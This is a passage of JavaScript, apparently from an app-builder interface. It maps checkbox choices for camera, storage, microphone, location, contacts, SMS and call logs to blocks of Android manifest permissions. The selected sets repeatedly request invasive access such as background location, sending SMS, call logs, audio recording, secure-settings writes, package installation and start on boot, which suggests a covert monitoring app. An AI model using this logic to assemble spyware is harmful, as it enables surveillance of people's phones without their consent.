            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }


          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
